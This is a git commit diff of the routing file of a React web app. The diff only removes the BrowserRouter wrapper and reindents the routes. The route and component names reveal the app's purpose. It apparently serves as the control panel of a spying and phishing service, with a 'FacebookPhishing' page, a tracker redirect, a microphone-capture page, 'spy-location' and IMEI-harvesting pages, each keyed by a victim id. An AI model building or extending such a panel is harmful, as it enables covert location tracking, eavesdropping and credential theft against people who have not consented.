0194c8531876d8d4aafddf3673522a77a03dcf55
ghostkyle24 <painel@ftm.com>
2025-08-03 17:12:58 -0300

    m

--- src/App.js
+++ src/App.js
@@ -7,7 +7,7 @@ import FacebookPhishing from './pages/FacebookPhishing';
 import MicrophonePage from './pages/MicrophonePage';
 import HowToGetIMEI from './pages/HowToGetIMEI';
 import IMEISupportRequest from './pages/IMEISupportRequest';
-import { BrowserRouter, Routes, Route, useParams } from 'react-router-dom';
+import { Routes, Route, useParams } from 'react-router-dom';
 
 function WhatsAppChat() {
   const { number } = useParams();
@@ -23,32 +23,30 @@ function App() {
   }
 
   return (
-    <BrowserRouter>
-      <Routes>
-        <Route path="/" element={
-          !usuario ? (
-            <Login onLogin={handleLogin} />
-          ) : (
-            <Dashboard email={usuario} />
-          )
-        } />
-        <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
-        <Route path="/spy-location" element={<Dashboard email={usuario} />} />
-        <Route path="/facebook" element={<Dashboard email={usuario} />} />
-        <Route path="/microphone" element={<Dashboard email={usuario} />} />
-        <Route path="/instagram" element={<Dashboard email={usuario} />} />
-        <Route path="/lessons" element={<Dashboard email={usuario} />} />
-        <Route path="/faq" element={<Dashboard email={usuario} />} />
-        <Route path="/support" element={<Dashboard email={usuario} />} />
-        {/* Rotas especiais: NÃO renderize Dashboard aqui! */}
-        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
-        <Route path="/imei-support-request" element={<IMEISupportRequest />} />
-        <Route path="/redirect/:id" element={<TrackerPage />} />
-        <Route path="/facebook/:id" element={<FacebookPhishing />} />
-        <Route path="/microphone/:id" element={<MicrophonePage />} />
-        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
-      </Routes>
-    </BrowserRouter>
+    <Routes>
+      <Route path="/" element={
+        !usuario ? (
+          <Login onLogin={handleLogin} />
+        ) : (
+          <Dashboard email={usuario} />
+        )
+      } />
+      <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
+      <Route path="/spy-location" element={<Dashboard email={usuario} />} />
+      <Route path="/facebook" element={<Dashboard email={usuario} />} />
+      <Route path="/microphone" element={<Dashboard email={usuario} />} />
+      <Route path="/instagram" element={<Dashboard email={usuario} />} />
+      <Route path="/lessons" element={<Dashboard email={usuario} />} />
+      <Route path="/faq" element={<Dashboard email={usuario} />} />
+      <Route path="/support" element={<Dashboard email={usuario} />} />
+      {/* Rotas especiais: NÃO renderize Dashboard aqui! */}
+      <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
+      <Route path="/imei-support-request" element={<IMEISupportRequest />} />
+      <Route path="/redirect/:id" element={<TrackerPage />} />
+      <Route path="/facebook/:id" element={<FacebookPhishing />} />
+      <Route path="/microphone/:id" element={<MicrophonePage />} />
+      <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
+    </Routes>
   );
 }
 
